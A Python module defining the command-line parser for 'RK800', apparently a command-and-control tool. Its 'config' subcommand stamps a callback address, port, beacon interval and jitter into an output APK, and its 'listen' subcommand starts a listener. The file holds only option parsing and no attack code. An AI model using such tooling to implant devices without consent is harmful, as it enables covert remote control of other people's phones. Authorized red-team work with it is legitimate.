import argparse
from typing import Any, NoReturn
from rk800.view import ViewManager

try:
    import argcomplete
except ImportError:
    argcomplete = None


class BadArgument(Exception):
    pass


class HelpShown(Exception):
    pass


class CmdParser(argparse.ArgumentParser):
    """Custom argument parser that raises exceptions instead of exiting."""

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        """Initialize CmdParser."""
        super().__init__(*args, **kwargs)
        self.view: ViewManager = None

    def _print_message(self, message: str, file: Any = None) -> None:
        """Print message using view formatting."""
        if message and self.view:
            for line in message.split("\n"):
                if line.strip():
                    self.view.info(line)

    def print_help(self, file: Any = None) -> None:
        """Print help and raise HelpShown."""
        self._print_message(self.format_help(), file)
        raise HelpShown()

    def exit(self, status: int = 0, message: str = None) -> NoReturn:
        """Handles exit calls from argparse."""
        if status == 0 and message:
            self._print_message(message)
            raise HelpShown()
        error_msg = message or "Invalid command or arguments provided."
        raise BadArgument(error_msg)

    def error(self, message: str) -> NoReturn:
        """Raises BadArgument for argument errors."""
        raise BadArgument(f"Argument error: {message}")


def create_parser():
    """Create command line argument parser

    Returns:
        argparse.ArgumentParser: configured argument parser
    """
    parser = argparse.ArgumentParser(
        prog="rk800",
        description="RK800 CLI Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    subparsers = parser.add_subparsers(dest="command", help="available commands")

    # configure client
    configure_parser = subparsers.add_parser("config", help="configure client")
    configure_parser.add_argument(
        "-i",
        "--beacon-interval",
        type=int,
        default=120,
        help="beacon interval in minutes, default: 120",
    )
    configure_parser.add_argument(
        "-j",
        "--beacon-jitter",
        type=int,
        default=60,
        help="beacon jitter in minutes, default: 60",
    )
    configure_parser.add_argument(
        "-w",
        "--connection-weight",
        type=int,
        default=0,
        help="commands per connection, default: 0 (no limit)",
    )
    configure_parser.add_argument(
        "-a", "--address", type=str, required=True, help="REQUIRED: callback address"
    )
    configure_parser.add_argument(
        "-p", "--port", type=int, required=True, help="REQUIRED: callback port"
    )
    configure_parser.add_argument(
        "-o",
        "--output",
        type=str,
        default="configured.apk",
        help="output APK file path, default: configured.apk",
    )
    configure_parser.add_argument(
        "-d", "--debug", action="store_true", help="enable debug logging"
    )

    # listen
    listen_parser = subparsers.add_parser("listen", help="start listening")
    listen_parser.add_argument("listen_addr", help="address to bind to")
    listen_parser.add_argument("listen_port", type=int, help="port to listen on")
    listen_parser.add_argument(
        "-d", "--debug", action="store_true", help="enable debug logging"
    )

    if argcomplete:
        argcomplete.autocomplete(parser)

    return parser


def parse_args(args=None):
    """Parse command line arguments

    Args:
        args: optional arguments list, uses sys.argv if None

    Returns:
        argparse.Namespace: parsed command line arguments
    """
    parser = create_parser()
    return parser.parse_args(args)
